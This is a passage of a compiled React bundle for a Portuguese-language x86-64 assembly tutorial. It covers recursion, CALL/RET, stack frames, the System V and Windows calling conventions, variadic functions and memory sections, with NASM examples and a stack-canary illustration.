    cmp rdi, 0
    jne .recursivo
    mov rax, 1              ; return 1
    jmp .epilogo

.recursivo:
    ; Guardar n antes da chamada recursiva
    mov rbx, rdi            ; rbx = n (preservado)

    ; fatorial(n-1)
    dec rdi                 ; rdi = n - 1
    call fatorial           ; rax = fatorial(n-1)

    ; resultado = n * fatorial(n-1)
    imul rax, rbx           ; rax = rax * n

.epilogo:
    ; Epílogo — restaura registradores
    pop rbx
    pop rbp
    ret

; Programa principal:
section .text
    global _start
_start:
    mov rdi, 10             ; calcular 10!
    call fatorial
    ; rax = 3628800
    mov rdi, rax
    ; ... imprimir resultado ...
    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsx("h2",{children:"Fibonacci Recursivo"}),r.jsx(d,{language:"nasm",filename:"fibonacci.asm",code:`; fib(n) = fib(n-1) + fib(n-2)
; fib(0) = 0, fib(1) = 1
; Argumento: rdi = n
; Retorno:   rax = fib(n)

fibonacci:
    push rbp
    mov  rbp, rsp
    push rbx

    ; Base cases: if (n <= 1) return n
    cmp rdi, 1
    jle .base_case

    ; Salvar n
    mov rbx, rdi            ; rbx = n

    ; fib(n-1)
    dec rdi
    call fibonacci
    push rax                ; salvar fib(n-1) na stack!

    ; fib(n-2)
    lea rdi, [rbx - 2]      ; rdi = n-2
    call fibonacci
    ; rax = fib(n-2)

    ; resultado = fib(n-1) + fib(n-2)
    pop rbx                 ; rbx = fib(n-1) (recupera da stack)
    add rax, rbx            ; rax = fib(n-1) + fib(n-2)

    jmp .fim

.base_case:
    mov rax, rdi            ; return n (0 ou 1)

.fim:
    pop rbx
    pop rbp
    ret`}),r.jsxs(T,{type:"warning",title:"Stackoverflow!",children:["Recursão profunda demais esgota o espaço da stack (tipicamente 8MB no Linux). Para n grande, use a versão iterativa ou ",r.jsx("strong",{children:"tail call optimization"}),"."]}),r.jsx("h2",{children:"Tail Call Optimization (TCO)"}),r.jsxs("p",{children:["Quando a chamada recursiva é a ",r.jsx("strong",{children:"última operação"})," da função, podemos substituir CALL+RET por JMP, reutilizando o mesmo frame:"]}),r.jsx(d,{language:"nasm",filename:"tail_call.asm",code:`; Fatorial com accumulator (tail-recursive):
; fatorial_tc(n, acc) = fatorial_tc(n-1, n*acc)
; fatorial_tc(0, acc) = acc
; fatorial(n) = fatorial_tc(n, 1)
;
; Argumentos: rdi = n, rsi = acc
; Retorno:    rax = n!

fatorial_tc:
    ; Base case:
    cmp rdi, 0
    jne .recursivo
    mov rax, rsi            ; return acc
    ret

.recursivo:
    ; Tail call: fatorial_tc(n-1, n*acc)
    imul rsi, rdi           ; acc = n * acc
    dec rdi                 ; n = n - 1
    ; Em vez de CALL + RET:
    jmp fatorial_tc         ; TCO! Sem novo frame na stack!
    ; Agora é O(1) de stack (iterativo na prática)`}),r.jsx("h2",{children:"Quicksort Recursivo"}),r.jsx(d,{language:"nasm",filename:"quicksort.asm",code:`; Quicksort em Assembly
; quicksort(arr, low, high)
; Argumentos: rdi=arr, rsi=low, rdx=high

quicksort:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13

    ; if (low >= high) return
    cmp rsi, rdx
    jge .fim

    ; Salvar argumentos
    mov rbx, rdi            ; rbx = arr
    mov r12, rsi            ; r12 = low
    mov r13, rdx            ; r13 = high

    ; pivot = arr[high]
    mov rcx, [rbx + r13*8]  ; pivot em rcx

    ; Particionar
    ; ... (implementação completa no capítulo ProjetoSort)

    ; Chamadas recursivas
    ; quicksort(arr, low, pivot_idx-1)
    ; quicksort(arr, pivot_idx+1, high)
    ; ...

.fim:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret`}),r.jsx("h2",{children:"Hanoi Recursiva"}),r.jsx(d,{language:"nasm",filename:"hanoi.asm",code:`; Torres de Hanoi — demonstra recursão elegante
; hanoi(n, from, to, via)
; Argumentos: rdi=n, rsi=from, rdx=to, rcx=via (strings)

section .data
    fmt_move db "Mover disco de peg %d para peg %d", 10, 0

section .text
    extern printf

hanoi:
    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    ; if (n == 0) return
    cmp rdi, 0
    je  .fim

    ; Salvar argumentos
    mov rbx, rdi    ; n
    mov r12, rsi    ; from
    mov r13, rdx    ; to
    mov r14, rcx    ; via

    ; hanoi(n-1, from, via, to)
    lea rdi, [rbx - 1]
    mov rsi, r12
    mov rdx, r14    ; via
    mov rcx, r13    ; to
    call hanoi

    ; Imprimir movimento: from → to
    lea rdi, [rel fmt_move]
    mov rsi, r12
    mov rdx, r13
    call printf

    ; hanoi(n-1, via, to, from)
    lea rdi, [rbx - 1]
    mov rsi, r14    ; via
    mov rdx, r13    ; to
    mov rcx, r12    ; from
    call hanoi

.fim:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret`})]})}function Qg(){return r.jsxs(L,{title:"Funções e a Stack",subtitle:"Como CALL, RET, e a stack trabalham juntas para implementar funções",difficulty:"intermediario",timeToRead:"18 min",children:[r.jsx("p",{children:"Funções em Assembly são implementadas pelas instruções CALL e RET, que usam a stack para salvar e restaurar o endereço de retorno. Entender isso é crucial para debugging e segurança."}),r.jsx("h2",{children:"CALL e RET — O Mecanismo"}),r.jsx(d,{language:"nasm",filename:"call_ret.asm",code:`; CALL funcao equivale a:
;   push rip + 5      ; empilha próxima instrução (endereço de retorno)
;   jmp funcao        ; pula para a função

; RET equivale a:
;   pop rip           ; desempilha endereço de retorno
;   jmp rip           ; pula para ele

; Demonstração manual (para entender, não use assim!):
    call .proximo       ; truque: empilha endereço de .proximo
.proximo:
    pop rax             ; rax = endereço de .proximo (valor do RIP!)
; Isso é como o shellcode "jmp/call/pop" funciona`}),r.jsx("h2",{children:"Uma Função Simples Completa"}),r.jsx(d,{language:"nasm",filename:"funcao_simples.asm",code:`; Função: soma(a, b) → retorna a + b
; ABI Linux: a=rdi, b=rsi, retorno=rax

section .text

soma:
    ; Prólogo (mínimo — sem variáveis locais)
    push rbp            ; salva base pointer antigo
    mov  rbp, rsp       ; estabelece frame atual

    ; Corpo da função
    mov rax, rdi        ; rax = a
    add rax, rsi        ; rax = a + b
    ; resultado já está em rax — pronto para retornar

    ; Epílogo
    pop rbp             ; restaura base pointer antigo
    ret                 ; retorna para o chamador

; Alternativa mínima (sem frame pointer — válido para funções leaf):
soma_minima:
    lea rax, [rdi + rsi] ; rax = a + b (usando LEA!)
    ret                   ; return`}),r.jsx("h2",{children:"Stack Frame Completo"}),r.jsx(d,{language:"nasm",filename:"stack_frame.asm",code:`; Função com variáveis locais:
; int funcao(int a, int b) {
;   int local1 = a + b;
;   int local2 = a * b;
;   return local1 + local2;
; }

funcao:
    ; === PRÓLOGO ===
    push rbp                ; salva RBP anterior
    mov  rbp, rsp           ; RBP = RSP (base do frame)
    sub  rsp, 16            ; reserva espaço para 2 locals (16 bytes, alinhado)

    ; --- variáveis locais ---
    ; [rbp - 8]  = local1
    ; [rbp - 16] = local2

    ; Corpo:
    mov rax, rdi
    add rax, rsi
    mov [rbp - 8], rax      ; local1 = a + b

    mov rax, rdi
    imul rax, rsi
    mov [rbp - 16], rax     ; local2 = a * b

    mov rax, [rbp - 8]
    add rax, [rbp - 16]     ; return local1 + local2

    ; === EPÍLOGO ===
    leave                   ; equivale a: mov rsp, rbp; pop rbp
    ret

; Layout da stack durante 'funcao':
; RSP antes:  0x7fff5000
; (depois de push rbp): 0x7fff4FF8 ← RBP anterior
; (depois de mov rbp, rsp): RBP = 0x7fff4FF8
; (depois de sub rsp, 16): RSP = 0x7fff4FE8
;
; [RBP + 0]  = valor antigo do RBP     (0x7fff4FF8)
; [RBP - 8]  = local1
; [RBP - 16] = local2 = RSP`}),r.jsx("h2",{children:"Instrução ENTER e LEAVE"}),r.jsx(d,{language:"nasm",filename:"enter_leave.asm",code:`; ENTER cria o prólogo automaticamente:
enter 16, 0     ; equivale a:
                ; push rbp
                ; mov rbp, rsp
                ; sub rsp, 16
; Obs: ENTER é mais lento que o prólogo manual!

; LEAVE faz o epílogo:
leave           ; equivale a:
                ; mov rsp, rbp
                ; pop rbp`}),r.jsx("h2",{children:"Chamada com Argumentos"}),r.jsx(d,{language:"nasm",filename:"chamada.asm",code:`; System V AMD64 ABI — argumentos em:
; rdi, rsi, rdx, rcx, r8, r9 (6 primeiros inteiros)
; xmm0-xmm7 (floats/doubles)
; Resto: na stack (em ordem reversa)

section .text
    global _start
    extern printf    ; função da libc

_start:
    ; Chamar: printf("Resultado: %d
", 42)
    ; Antes de CALL, stack deve estar alinhada em 16!

    sub rsp, 8               ; alinha stack (já está alinhada em 16)
                             ; o CALL vai empilhar mais 8 bytes (retorno)

    lea rdi, [rel fmt]       ; 1º argumento: format string
    mov rsi, 42              ; 2º argumento: o número
    xor eax, eax             ; rax = 0 (número de args SSE para printf variadic)
    call printf

    add rsp, 8               ; restaura stack

    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall

section .data
    fmt db "Resultado: %d", 10, 0`}),r.jsx(T,{type:"warning",title:"Stack Alignment",children:"Antes de qualquer CALL, a stack DEVE estar alinhada em 16 bytes. O _start começa com RSP alinhado. Cada PUSH/POP muda RSP em 8 bytes. CALL em si empilha 8 bytes (endereço de retorno). Se você faz um PUSH antes do CALL, você está OK (8+8=16). Se não fez nenhum PUSH, sub rsp, 8 antes do CALL."}),r.jsx("h2",{children:"Função com Muitos Argumentos"}),r.jsx(d,{language:"nasm",filename:"muitos_args.asm",code:`; Chamar: funcao(1, 2, 3, 4, 5, 6, 7, 8)
; args 7 e 8 vão para a stack

    ; Empilhar argumentos extras (ordem reversa, 8º primeiro)
    push 8              ; 8º argumento (no topo da stack = acessível como [rsp+8] após call)
    push 7              ; 7º argumento

    ; Primeiros 6 em registradores:
    mov rdi, 1
    mov rsi, 2
    mov rdx, 3
    mov rcx, 4
    mov r8,  5
    mov r9,  6

    call funcao

    ; Limpar argumentos da stack:
    add rsp, 16         ; remover os 2 argumentos (2 × 8 = 16)

; Na função chamada, args na stack ficam em:
; [rbp + 16] = 7º argumento (16 = 8 do ret addr + 8 do rbp salvo)
; [rbp + 24] = 8º argumento`}),r.jsx("h2",{children:"Red Zone — Área Livre Abaixo do RSP"}),r.jsx(T,{type:"info",title:"Red Zone",children:'No System V AMD64 ABI, os 128 bytes abaixo do RSP são chamados de "red zone". Funções leaf (que não chamam outras funções) podem usar essa área para variáveis temporárias SEM precisar ajustar o RSP. Mais eficiente!'}),r.jsx(d,{language:"nasm",filename:"red_zone.asm",code:`; Função leaf usando red zone:
funcao_leaf:
    ; Sem prólogo! (sem push rbp, sem sub rsp)
    
    mov [rsp - 8],  rdi    ; salva 1ª variável local
    mov [rsp - 16], rsi    ; salva 2ª variável local
    
    ; ... usa as variáveis ...
    
    ret                    ; sem epílogo!
; NUNCA use red zone se a função chamar outra função!`})]})}function Yg(){return r.jsxs(L,{title:"Calling Conventions",subtitle:"System V AMD64, Microsoft x64 e as regras de como funções se comunicam",difficulty:"avancado",timeToRead:"20 min",children:[r.jsxs("p",{children:["Uma ",r.jsx("strong",{children:"calling convention"})," é um conjunto de regras que define como argumentos são passados, como o retorno é feito, e quais registradores cada parte deve preservar. Sem seguir a convenção, funções não podem se comunicar."]}),r.jsx("h2",{children:"System V AMD64 ABI — Linux/macOS"}),r.jsx("p",{children:"A convenção padrão no Linux, macOS e BSD para x86-64:"}),r.jsx("h3",{children:"Passagem de Argumentos (inteiros e ponteiros)"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Argumento"}),r.jsx("th",{children:"Registrador"}),r.jsx("th",{children:"Exemplo"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"1º"}),r.jsx("td",{children:"RDI"}),r.jsx("td",{children:"foo(a, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"2º"}),r.jsx("td",{children:"RSI"}),r.jsx("td",{children:"foo(a, b, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"3º"}),r.jsx("td",{children:"RDX"}),r.jsx("td",{children:"foo(a, b, c, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"4º"}),r.jsx("td",{children:"RCX"}),r.jsx("td",{children:"foo(a, b, c, d, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"5º"}),r.jsx("td",{children:"R8"}),r.jsx("td",{children:"foo(a, b, c, d, e, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"6º"}),r.jsx("td",{children:"R9"}),r.jsx("td",{children:"foo(a, b, c, d, e, f, ...)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"7º+"}),r.jsx("td",{children:"Stack"}),r.jsx("td",{children:"empilhados da direita para esquerda"})]})]})]}),r.jsx("h3",{children:"Passagem de Floats/Doubles"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Argumento float"}),r.jsx("th",{children:"Registrador"})]})}),r.jsx("tbody",{children:["XMM0","XMM1","XMM2","XMM3","XMM4","XMM5","XMM6","XMM7"].map((i,l)=>r.jsxs("tr",{children:[r.jsxs("td",{children:[l+1,"º float/double"]}),r.jsx("td",{children:i})]},i))})]}),r.jsx("h3",{children:"Retorno de Valores"}),r.jsx(d,{language:"bash",code:`# Inteiros e ponteiros:
# Valor de 64-bit ou menor → RAX
# Valor de 128-bit → RDX:RAX

# Floats/doubles:
# 1 float/double → XMM0
# 2 floats/doubles (struct) → XMM0, XMM1

# Structs pequenas (≤ 16 bytes):
# passadas em RAX, RDX (ou XMM0, XMM1 se forem float)

# Structs grandes (> 16 bytes):
# caller aloca espaço e passa ponteiro em RDI (hidden first argument)
# todos os outros args deslocam um registrador`}),r.jsx("h3",{children:"Registradores: Caller-Saved vs Callee-Saved"}),r.jsx(d,{language:"bash",code:`# Caller-Saved (scratch registers):
# RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11
# XMM0-XMM15
# Se você precisar desses valores após um CALL, salve-os ANTES do call!

# Callee-Saved (preserved registers):
# RBX, RBP, R12, R13, R14, R15
# Se uma função usar esses registradores, DEVE restaurá-los antes de RET
# (usando push no prólogo e pop no epílogo)

# Exemplo:
minha_funcao:
    push rbx     ; salvar registradores callee-saved que vou usar
    push r12
    push r13

    mov rbx, rdi     ; posso usar rbx livremente agora
    ; ... lógica ...

    pop r13      ; restaurar em ORDEM INVERSA
    pop r12
    pop rbx
    ret`}),r.jsx("h2",{children:"Microsoft x64 ABI — Windows"}),r.jsx(T,{type:"warning",title:"Diferente do Linux!",children:"Windows usa uma ABI diferente! Código compilado para Windows não é compatível com convenções Linux. Cuidado ao portar código Assembly."}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"System V (Linux)"}),r.jsx("th",{children:"Microsoft x64 (Windows)"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"1º argumento int"}),r.jsx("td",{children:"RDI"}),r.jsx("td",{children:"RCX"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"2º argumento int"}),r.jsx("td",{children:"RSI"}),r.jsx("td",{children:"RDX"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"3º argumento int"}),r.jsx("td",{children:"RDX"}),r.jsx("td",{children:"R8"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"4º argumento int"}),r.jsx("td",{children:"RCX"}),r.jsx("td",{children:"R9"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"5º+ argumentos"}),r.jsx("td",{children:"R8, R9, stack"}),r.jsx("td",{children:"Stack (com shadow space!)"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"1º argumento float"}),r.jsx("td",{children:"XMM0"}),r.jsx("td",{children:"XMM0"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Retorno int"}),r.jsx("td",{children:"RAX"}),r.jsx("td",{children:"RAX"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Retorno float"}),r.jsx("td",{children:"XMM0"}),r.jsx("td",{children:"XMM0"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Caller-saved"}),r.jsx("td",{children:"RAX,RCX,RDX,RSI,RDI,R8-R11,XMM0-15"}),r.jsx("td",{children:"RAX,RCX,RDX,R8-R11,XMM0-5"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Callee-saved"}),r.jsx("td",{children:"RBX,RBP,R12-R15"}),r.jsx("td",{children:"RBX,RBP,RDI,RSI,R12-R15,XMM6-15"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Red zone"}),r.jsx("td",{children:"128 bytes"}),r.jsx("td",{children:"NÃO existe"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Shadow space"}),r.jsx("td",{children:"NÃO existe"}),r.jsx("td",{children:"32 bytes obrigatórios"})]})]})]}),r.jsx("h3",{children:"Shadow Space no Windows"}),r.jsx(d,{language:"nasm",filename:"windows_call.asm",code:`; Windows x64: SEMPRE reservar 32 bytes antes de qualquer CALL
; ("home space" ou "shadow space")

_start:
    sub rsp, 40       ; 32 bytes shadow + 8 bytes alinhamento (total=40)

    ; Chamar: MyFunc(1, 2, 3, 4)
    mov rcx, 1        ; 1º argumento (NOT rdi!)
    mov rdx, 2        ; 2º argumento
    mov r8,  3        ; 3º argumento
    mov r9,  4        ; 4º argumento
    call MyFunc

    add rsp, 40       ; restaurar stack

; Por que shadow space?
; A função chamada PODE escrever os registradores de args nesse espaço
; para facilitar debugging com argumentos variádicos`}),r.jsx("h2",{children:"cdecl (32-bit Legacy)"}),r.jsx(d,{language:"nasm",filename:"cdecl.asm",code:`; cdecl — convenção C de 32-bit
; Argumentos: na stack, da direita para esquerda
; Retorno: EAX (inteiros), EAX:EDX (64-bit), ST0 (float)
; Limpeza: responsabilidade do CALLER

; Chamada de printf("Hello %d", 42) em 32-bit:
push 42
push hello_fmt
call printf
add esp, 8          ; caller limpa a stack (2 argumentos × 4 bytes)`}),r.jsx("h2",{children:"stdcall (32-bit Windows)"}),r.jsx(d,{language:"nasm",filename:"stdcall.asm",code:`; stdcall — convenção padrão Win32 API
; Argumentos: na stack, da direita para esquerda
; Retorno: EAX
; Limpeza: responsabilidade do CALLEE (ret N)

MessageBoxA_stdcall:
    ; ... corpo ...
    ret 16          ; limpa 4 argumentos × 4 bytes = 16 bytes`}),r.jsx("h2",{children:"Verificando a ABI com GCC"}),r.jsx(d,{language:"bash",code:`# Ver Assembly gerado pelo GCC para entender a ABI:
cat > teste.c << 'EOF'
int soma(int a, int b, int c, int d, int e, int f, int g) {
    return a+b+c+d+e+f+g;
}
EOF

gcc -S -O2 -masm=intel teste.c
cat teste.s

# Você verá que os primeiros 6 argumentos vêm de registradores
# e o 7º vem de [rbp+16] (stack)`})]})}function Kg(){return r.jsxs(L,{title:"Stack Frame",subtitle:"Anatomia completa de um frame de função na stack",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["O ",r.jsx("strong",{children:"stack frame"})," (ou activation record) é o bloco de memória que cada chamada de função reserva na stack. Entender sua estrutura é fundamental para debugging, exploits e otimização."]}),r.jsx("h2",{children:"Anatomia de um Stack Frame"}),r.jsx(d,{language:"bash",code:`; Após o prólogo de uma função (push rbp; mov rbp, rsp; sub rsp, N):
;
; Endereços crescentes ↑
;
; [rbp + 8*n]  ← argumentos extras (7º, 8º...) se houver
; [rbp + 16]   ← 7º argumento (se passou pela stack)
; [rbp +  8]   ← endereço de retorno (empilhado pelo CALL)
; [rbp +  0]   ← RBP anterior (empilhado pelo push rbp) ← RBP aponta aqui
; [rbp -  8]   ← variável local 1
; [rbp - 16]   ← variável local 2
; [rbp - 24]   ← variável local 3
; ...
; [rsp +  0]   ← última variável local ← RSP aponta aqui
;
; Endereços decrescentes ↓`}),r.jsx("h2",{children:"Exemplo Real com Debugger"}),r.jsx(d,{language:"nasm",filename:"frame_exemplo.asm",code:`; Função com 3 variáveis locais e 2 argumentos de registrador
; C equivalente:
; long calcular(long a, long b) {
;   long x = a + b;
;   long y = a * b;
;   long z = x - y;
;   return z;
; }

calcular:
    ; --- PRÓLOGO ---
    push rbp          ; [rsp] = rbp antigo; rsp -= 8
    mov  rbp, rsp     ; rbp = rsp (= endereço do rbp antigo)
    sub  rsp, 24      ; reserva 24 bytes para 3 variáveis (alinhado a 16? 24 sim!)
    ; Agora: rbp = topo após push, rsp = rbp - 24

    ; Mapa de memória:
    ; [rbp + 8]  = endereço de retorno (automático pelo CALL)
    ; [rbp + 0]  = rbp anterior (nosso push rbp)
    ; [rbp - 8]  = variável x
    ; [rbp - 16] = variável y
    ; [rbp - 24] = variável z = rsp atual

    ; --- CORPO ---
    ; a = rdi, b = rsi
    mov rax, rdi
    add rax, rsi
    mov [rbp - 8], rax    ; x = a + b

    mov rax, rdi
    imul rax, rsi
    mov [rbp - 16], rax   ; y = a * b

    mov rax, [rbp - 8]
    sub rax, [rbp - 16]
    mov [rbp - 24], rax   ; z = x - y

    mov rax, [rbp - 24]   ; return z

    ; --- EPÍLOGO ---
    leave             ; mov rsp, rbp; pop rbp
    ret`}),r.jsx("h2",{children:"Inspecionando a Stack no GDB"}),r.jsx(d,{language:"bash",filename:"gdb_stack.txt",code:`(gdb) break calcular
(gdb) run

# Após o prólogo, inspecionar o frame:
(gdb) info frame
Stack level 0, frame at 0x7fffffffde80:
 rip = 0x401010 in calcular; saved rip = 0x401055
 Called by frame at 0x7fffffffde90
 Arglist at 0x7fffffffde78, args: a=10, b=5
 Locals at 0x7fffffffde78, Previous frame's sp at 0x7fffffffde88

(gdb) info locals
x = 0    # ainda não inicializado
y = 0
z = 0

(gdb) p $rbp
$1 = (void *) 0x7fffffffde78

(gdb) x/8gx $rbp - 24
# Ver 8 qwords ao redor do frame:
0x7fffffffde60: 0x0000000000000000  0x0000000000000000  # z, y
0x7fffffffde70: 0x0000000000000000  0x00007fffffffde90  # x, rbp antigo
0x7fffffffde80: 0x0000000000401055  0x0000000000000005  # ret addr, b=5
0x7fffffffde88: 0x000000000000000a  ...                 # a=10, ...`}),r.jsx("h2",{children:"Omitting Frame Pointer (OFP)"}),r.jsx(T,{type:"info",title:"gcc -fomit-frame-pointer",children:"Com otimização, o GCC frequentemente omite o frame pointer (RBP). Isso libera RBP para uso geral mas dificulta debugging. Use -fno-omit-frame-pointer para debugging mais fácil."}),r.jsx(d,{language:"nasm",filename:"sem_frame.asm",code:`; Função sem frame pointer (comum com -O2):
funcao_otimizada:
    ; Sem push rbp, sem mov rbp rsp
    ; Variáveis locais relativas ao RSP:
    sub rsp, 24       ; reserva 3 variáveis

    ; Acessar via RSP:
    mov [rsp + 0],  rax    ; variável 1
    mov [rsp + 8],  rbx    ; variável 2
    mov [rsp + 16], rcx    ; variável 3

    ; Antes de qualquer CALL interno:
    ; RSP deve estar alinhado em 16!
    call outra_funcao       ; RSP deve ser múltiplo de 16 aqui

    add rsp, 24
    ret`}),r.jsx("h2",{children:"Variáveis na Stack vs Registradores"}),r.jsx(d,{language:"nasm",filename:"stack_vs_reg.asm",code:`; O compilador tenta manter variáveis em registradores (mais rápido)
; e usa a stack apenas quando:
; 1. Precisa de mais variáveis do que registradores disponíveis
; 2. Variável precisa de endereço (int x; &x)
; 3. Arrays locais (array no stack)
; 4. Estruturas grandes

; Exemplo: array local na stack
funcao_array:
    push rbp
    mov  rbp, rsp
    sub  rsp, 80        ; array de 10 ints (10 × 8 = 80 bytes)
    ; [rbp - 80] até [rbp - 8] = array

    ; inicializar array[0..9] = i*i
    xor rcx, rcx
.loop:
    cmp rcx, 10
    jge .fim
    mov rax, rcx
    imul rax, rax           ; rax = i*i
    mov [rbp + rcx*8 - 80], rax  ; array[i] = i*i
    inc rcx
    jmp .loop
.fim:
    leave
    ret`}),r.jsx("h2",{children:"Stack Canary (Proteção contra Buffer Overflow)"}),r.jsx(d,{language:"nasm",filename:"canary.asm",code:`; Stack canary: valor aleatório inserido entre variáveis locais e o endereço de retorno
; Se um buffer overflow sobrescrever o canary, o programa detecta e para.

; GCC com -fstack-protector gera algo assim:
funcao_protegida:
    push rbp
    mov  rbp, rsp
    sub  rsp, 32

    ; Ler canary do segmento FS (thread-local storage):
    mov rax, [fs:0x28]          ; lê canary global
    mov [rbp - 8], rax          ; salva na stack (acima das variáveis!)

    ; ... corpo da função (buffer em [rbp-32] a [rbp-16]) ...

    ; Antes de retornar, verificar canary:
    mov rax, [rbp - 8]          ; lê canary da stack
    xor rax, [fs:0x28]          ; compara com original
    jnz .stack_smash            ; se diferente → overflow detectado!

    leave
    ret

.stack_smash:
    call __stack_chk_fail       ; termina o programa com erro`})]})}function Wg(){return r.jsxs(L,{title:"Funções Variádicas",subtitle:"Implementando funções com número variável de argumentos em Assembly",difficulty:"avancado",timeToRead:"12 min",children:[r.jsxs("p",{children:["Funções variádicas (como printf) aceitam um número arbitrário de argumentos. Em x86-64, o System V AMD64 ABI define um protocolo específico para isso usando ",r.jsx("code",{children:"va_list"}),"."]}),r.jsx("h2",{children:"Como Variádicos Funcionam"}),r.jsx(d,{language:"nasm",filename:"varargs_intro.asm",code:`; printf("Formato: %d %d %s", 1, 2, "ola")
; Em Assembly (System V AMD64):

    lea rdi, [rel fmt]    ; format string
    mov rsi, 1            ; 1º arg variadic
    mov rdx, 2            ; 2º arg variadic
    lea rcx, [rel str]    ; 3º arg variadic
    xor eax, eax          ; IMPORTANTE: RAX = número de argumentos XMM usados
                          ; Para printf variádico sem floats: RAX = 0
    call printf`}),r.jsx("h2",{children:"va_start, va_arg, va_end"}),r.jsx(d,{language:"nasm",filename:"va_list.asm",code:`; Para implementar função variádica, devemos salvar todos os args possíveis
; A estrutura va_list no System V AMD64:
; typedef struct {
;   unsigned int gp_offset;   /* offset do próx int arg (inicialmente 6*8=48 se 6 regs usados) */
;   unsigned int fp_offset;   /* offset do próx float arg */
;   void *overflow_arg_area;  /* ponteiro para args na stack */
;   void *reg_save_area;      /* área onde args de regs foram salvos */
; } va_list[1];

; Exemplo: soma variádica de N inteiros
; int soma_n(int count, ...)
; Argumentos: rdi=count, rsi=arg1, rdx=arg2, rcx=arg3, r8=arg4, r9=arg5, stack=...

soma_n:
    push rbp
    mov  rbp, rsp
    sub  rsp, 192        ; 48 bytes para int regs + 128 para float + 16 para va_list

    ; Salvar registradores de argumento na reg_save_area:
    ; (só salvar os que vieram após 'count', que usou RDI)
    mov [rbp - 48],  rsi   ; reg_save_area[0]
    mov [rbp - 40],  rdx
    mov [rbp - 32],  rcx
    mov [rbp - 24],  r8
    mov [rbp - 16],  r9

    ; Inicializar va_list:
    ; gp_offset = 8 (pular o primeiro registrador — count já foi usado)
    ; overflow_arg_area = rbp + 16 (argumentos na stack)
    ; reg_save_area = rbp - 48

    ; ... iterar pelos argumentos ...

    leave
    ret`}),r.jsx("h2",{children:"Exemplo: printf Simples"}),r.jsx(d,{language:"nasm",filename:"printf_simples.asm",code:`; Chamar printf com diferentes tipos:

section .data
    fmt_int  db "Int: %d", 10, 0
    fmt_str  db "Str: %s", 10, 0
    fmt_hex  db "Hex: 0x%lx", 10, 0
    ola      db "Hello!", 0

section .text
    global _start
    extern printf, exit

_start:
    ; printf("Int: %d
", 42)
    lea rdi, [rel fmt_int]
    mov rsi, 42
    xor eax, eax
    call printf

    ; printf("Str: %s
", "Hello!")
    lea rdi, [rel fmt_str]
    lea rsi, [rel ola]
    xor eax, eax
    call printf

    ; printf("Hex: 0x%lx
", 0xDEADBEEF)
    lea rdi, [rel fmt_hex]
    mov rsi, 0xDEADBEEF
    xor eax, eax
    call printf

    ; exit(0)
    xor edi, edi
    call exit`}),r.jsx("h2",{children:"scanf — Lendo Dados"}),r.jsx(d,{language:"nasm",filename:"scanf.asm",code:`section .data
    fmt_in  db "%d", 0     ; formato para scanf
    resultado dq 0         ; variável para guardar o resultado

section .text
    extern scanf, printf
    global _start

_start:
    ; scanf("%d", &resultado)
    lea rdi, [rel fmt_in]
    lea rsi, [rel resultado]   ; passar ENDEREÇO da variável!
    xor eax, eax
    call scanf

    ; Usar o valor lido:
    mov rax, [rel resultado]
    ; ... processar ...`})]})}function Jg(){return r.jsxs(L,{title:"Segmentos de Memória",subtitle:".text, .data, .bss, .rodata e como o linker organiza um programa",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsxs("p",{children:["Um programa em Assembly é dividido em ",r.jsx("strong",{children:"seções"})," (ou segmentos), cada uma com propósito e permissões específicas. O linker organiza essas seções no executável final."]}),r.jsx("h2",{children:"As Seções Principais"}),r.jsx("h3",{children:".text — Código Executável"}),r.jsx(d,{language:"nasm",filename:"texto.asm",code:`section .text
    global _start

_start:
    ; Código vai aqui
    ; Permissões: READ + EXECUTE (não escrevível)
    ; NX bit (No-eXecute) protege outras seções

    mov rax, 60
    xor rdi, rdi
    syscall`}),r.jsx("h3",{children:".data — Dados Inicializados"}),r.jsx(d,{language:"nasm",filename:"data.asm",code:`section .data
    ; Dados que têm valor inicial e podem ser modificados em runtime
    ; Permissões: READ + WRITE (não executável)

    contador  dq 0          ; variável inteira inicializada com 0
    pi        dq 3.14       ; float
    mensagem  db "Hello!", 10, 0
    array     dq 1, 2, 3, 4, 5    ; array de 5 qwords
    matrix    times 9 dq 0         ; 9 qwords zerados (matriz 3×3)

    ; Declarações:
    ; db = define byte   (8-bit)
    ; dw = define word   (16-bit)
    ; dd = define dword  (32-bit)
    ; dq = define qword  (64-bit)
    ; dt = define tword  (80-bit, para x87 FPU)
    ; ddq = define dqword (128-bit, para XMM)
    ; do = define oword   (128-bit)`}),r.jsx("h3",{children:".rodata — Dados Somente Leitura"}),r.jsx(d,{language:"nasm",filename:"rodata.asm",code:`section .rodata
    ; Dados que não mudam em runtime (constantes)
